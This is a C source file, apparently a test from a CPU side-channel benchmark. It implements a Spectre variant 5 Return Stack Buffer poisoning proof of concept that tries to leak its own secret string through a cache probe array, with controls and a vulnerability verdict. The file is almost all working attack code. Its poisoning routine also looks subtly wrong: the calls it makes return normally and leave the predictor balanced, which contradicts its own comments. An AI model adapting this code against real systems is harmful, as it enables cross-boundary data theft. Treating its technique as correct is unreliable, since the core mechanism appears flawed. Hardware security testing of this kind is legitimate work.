/**
 * spectre-v5: Return Stack Buffer poisoning (SpectreRSB / ret2spec).
 *
 * Variant 5 abuses the return-address predictor (the core's RAS, 16 entries,
 * updated at decode and restored from a committed copy on flush).  The
 * attacker fills the RSB with a gadget return address via calls, then a
 * victim return that has no matching call speculatively pops the attacker's
 * entry and transiently executes the gadget.  Multi-byte: the gadget leaks
 * secret_str[leak_index]; each byte is recovered from the probe argmax.
 * A null arm (benign gadget) and positive control make the verdict rigorous.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 80
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define RSB_DEPTH 16

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";
static volatile uint32_t leak_index;

__attribute__((noinline))
static void gadget_secret(void) {
  volatile uint8_t t =
      probe_array[(uintptr_t)(uint8_t)secret_str[leak_index] * SC_PROBE_STRIDE];
  (void)t;
}
__attribute__((noinline))
static void gadget_null(void) {
  volatile uint8_t t = probe_array[0];
  (void)t;
}

static void (*volatile rsb_gadget)(void);

/* Poison the RSB: a chain of calls pushes the gadget return address deep into
 * the RSB.  Each call site's return address is the instruction after the call;
 * by calling through a pointer to the gadget the RSB learns gadget targets. */
__attribute__((noinline))
static void poison_rsb(void) {
  for (int i = 0; i < RSB_DEPTH; i++)
    rsb_gadget();
}

/* Victim: a return whose RSB prediction was poisoned.  Architecturally it
 * returns to its caller; transiently the RSB may redirect to the gadget. */
__attribute__((noinline))
static void victim_return(void) {
  asm volatile("" ::: "memory");
}

static int read_byte(int idx, const sc_geom_t *g, uint32_t tries,
                     uint32_t *score) {
  leak_index = (uint32_t)idx;
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    sc_evict_capacity(g);
    volatile uint8_t sink = (uint8_t)secret_str[leak_index];
    (void)sink;
    sc_fence();
    rsb_gadget = gadget_secret;
    poison_rsb();      /* fill RSB with gadget targets */
    victim_return();   /* speculative return may hit poisoned RSB */
    sc_fence();
    sc_probe_array(probe_array, g, &atk, 0x51de + t);
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

int main(void) {
  if (sc_time_selfcheck("spectre-v5") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v5 ERROR reason=evict\n");
    return 1;
  }
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;
  leak_index = 0;
  int expect = (uint8_t)secret_str[0];

  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    gadget_secret();
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xb0b + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[spectre-v5] leaking %d bytes via RSB poisoning:\n",
         SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte(i, &g, R, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x got=0x%02x score=%u/%u %s\n",
           i, (uint8_t)secret_str[i], got, (unsigned)scores[i],
           (unsigned)R, ok ? "OK" : "miss");
  }

  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  leak_index = 0;
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    rsb_gadget = gadget_secret;
    poison_rsb();
    victim_return();
    sc_fence();
    sc_probe_array(probe_array, &g, &atk, 0x2222 + r);
    atk.rounds++;
    sc_evict_capacity(&g);
    sc_fence();
    rsb_gadget = gadget_null;
    poison_rsb();
    victim_return();
    sc_fence();
    sc_probe_array(probe_array, &g, &nul, 0x3333 + r);
    nul.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  sc_result("spectre-v5", &d, pos_ok, expect, R, &g);
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v5-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[spectre-v5] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (multibit_ok || d.verdict == SC_VULNERABLE)
    printf("[spectre-v5] VULNERABLE: RSB poisoning leak\n");
  else if (!pos_ok)
    printf("[spectre-v5] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-v5] NOT VULNERABLE: RSB restored on flush (mitigated)\n");
  return 0;
}